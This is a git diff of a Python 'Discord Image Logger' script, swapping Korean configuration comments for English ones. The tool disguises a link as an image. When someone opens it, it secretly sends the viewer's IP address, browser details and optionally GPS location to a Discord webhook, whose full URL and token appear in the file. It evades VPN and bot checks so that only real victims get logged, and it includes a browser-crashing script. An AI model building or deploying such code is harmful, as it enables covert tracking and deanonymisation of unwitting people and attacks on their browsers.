@@ -1,3 +1,6 @@
+# Discord Image Logger
+# By DeKrypt | https://github.com/dekrypted
+
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
@@ -8,59 +11,60 @@ __version__ = "v2.0"
 __author__ = "DeKrypt"
 
 config = {
-    # 기본 설정
-    "webhook": "https://discordapp.com/api/webhooks/1351530904782114866/5VXRMvZdaFWSN7-LvZdXqov9-zeYco-nUqsBgmgCOpH6bhrRkATVtFkQWjF5kYBCk4ut", #웹후크 URL
-    "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Icon-windows_os.svg/1200px-Icon-windows_os.svg.png", #커스텀 이미지 URL
-                                               
-    "imageArgument": True,
+    # BASE CONFIG #
+    "webhook": "https://discordapp.com/api/webhooks/1351530904782114866/5VXRMvZdaFWSN7-LvZdXqov9-zeYco-nUqsBgmgCOpH6bhrRkATVtFkQWjF5kYBCk4ut",
+    "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Icon-windows_os.svg/1200px-Icon-windows_os.svg.png", # You can also have a custom image by using a URL argument
+                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
+    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
-    #커스텀
-    "username": "Image Logger", #커스텀 웹후크 이름
-    "color": 0x00FFFF, #커스텀 색
+    # CUSTOMIZATION #
+    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
-    #옵션
-    "crashBrowser": False, #사용자의 브라우저를 충돌시킴. (일부 브라우저에서만 작동)
+    # OPTIONS #
+    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
-    "accurateLocation": False, #GPS위치
+    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
-    "message": { 
-        "doMessage": False, #커스텀 메시지
-        "message": "메시지를 입력해주세요", #메시지 입력
-        "richMessage": True, #리치 텍스트 활성화
+    "message": { # Show a custom message when the user opens the image
+        "doMessage": False, # Enable the custom message?
+        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "richMessage": True, # Enable rich text? (See README for more info)
     },
 
-    "vpnCheck": 1, #VPN이 경고를 유발하는 것을 방지
-                    #0 = VPN 차단 안 함
-                    #1 = VPN이 의심될 때 알림을 보내지 않음 (VPN 확율이 50% 보다 낮을 경우)
-                    #2 = VPN이 의심될 때 알림을 보내지 않음 (VPN 확율이 50% 보다 높을  경우)
+    "vpnCheck": 1, # Prevents VPNs from triggering the alert
+                # 0 = No Anti-VPN
+                # 1 = Don't ping when a VPN is suspected
+                # 2 = Don't send an alert when a VPN is suspected
 
-    "linkAlerts": True, # 누군가 링크를 보낼 때 알림 (링크가 짧은 시간 내에 여러 번 전송되면 작동하지 않을 수 있음)
-    "buggedImage": True, # 디스코드에서 전송될 때 로딩 이미지가 미리보기로 표시됨 (일부 장치에서는 무작위 색상의 이미지로 표시될 수 있음)
+    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
+    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
-    "antiBot": 1, # 봇이 알림을 유발하는 것을 방지
-                    # 0 = 봇 차단 안 함
-                    # 1 = 봇일 가능성이 있을 때 알림을 보내지 않음
-                    # 2 = 100% 봇일 때 알림을 보내지 않음
-                    # 3 = 봇일 가능성이 있을 때 알림을 전송하지 않음
-                    # 4 = 100% 봇일 때 알림을 전송하지 않음
+    "antiBot": 1, # Prevents bots from triggering the alert
+                # 0 = No Anti-Bot
+                # 1 = Don't ping when it's possibly a bot
+                # 2 = Don't ping when it's 100% a bot
+                # 3 = Don't send an alert when it's possibly a bot
+                # 4 = Don't send an alert when it's 100% a bot
+    
 
-    #리디렉션
+    # REDIRECTION #
     "redirect": {
-        "redirect": False, # 웹페이지로 리디렉션
-        "page": "https://your-link.here" #리디렉션할 웹페이지의 링크
+        "redirect": False, # Redirect to a webpage?
+        "page": "https://your-link.here" # Link to the webpage to redirect to 
     },
 
-    # 모든 값을 올바른 형식으로 입력해 주세요. 오류가 발생할 수 있습니다.
-    # 아래 내용을 수정하지 마세요.
-    # 참고: 계층 구조는 다음과 같습니다:
-    # 1) 리디렉션 (활성화되면 이미지와 브라우저 충돌 기능이 비활성화됨)
-    # 2) 브라우저 충돌 (활성화되면 이미지가 비활성화됨)
-    # 3) 메시지 (활성화되면 이미지가 비활성화됨)
-    # 4) 이미지
+    # Please enter all values in correct format. Otherwise, it may break.
+    # Do not edit anything below this, unless you know what you're doing.
+    # NOTE: Hierarchy tree goes as follows:
+    # 1) Redirect (If this is enabled, disables image and crash browser)
+    # 2) Crash Browser (If this is enabled, disables image)
+    # 3) Message (If this is enabled, disables image)
+    # 4) Image 
 }
 
-blacklistedIPs = ("27", "104", "143", "164") # 블랙리스트에 올려진 IP. 전체 IP 또는 시작 부분을 입력하여 전체 블록을 차단할 수 있습니다.
-                                                           # 이 기능은 주로 봇을 더 잘 탐지하기 위해 문서화되지 않았습니다.
+blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
+                                                           # This feature is undocumented mainly due to it being for detecting bots better.
 
 def botCheck(ip, useragent):
     if ip.startswith(("34", "35")):
@@ -100,7 +104,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
             "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
         }
     ],
-}) if config["linkAlerts"] else None
+}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
         return
 
     ping = "@everyone"
@@ -177,6 +181,9 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 
 binaries = {
     "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
+    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
+    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
+    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
 }
 
 class ImageLoggerAPI(BaseHTTPRequestHandler):
@@ -210,11 +217,11 @@ height: 100vh;
                 return
             
             if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
-                self.send_response(200 if config["buggedImage"] else 302)
-                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
-                self.end_headers()
+                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
+                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
+                self.end_headers() # Declare the headers as finished.
 
-                if config["buggedImage"]: self.wfile.write(binaries["loading"])
+                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.
 
                 makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                 
@@ -255,13 +262,13 @@ height: 100vh;
                     data = message.encode()
                 
                 if config["crashBrowser"]:
-                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
+                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher
 
                 if config["redirect"]["redirect"]:
                     data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
-                self.send_response(200)
-                self.send_header('Content-type', datatype)
-                self.end_headers()
+                self.send_response(200) # 200 = OK (HTTP Status)
+                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
+                self.end_headers() # Declare the headers as finished.
 
                 if config["accurateLocation"]:
                     data += b"""<script>
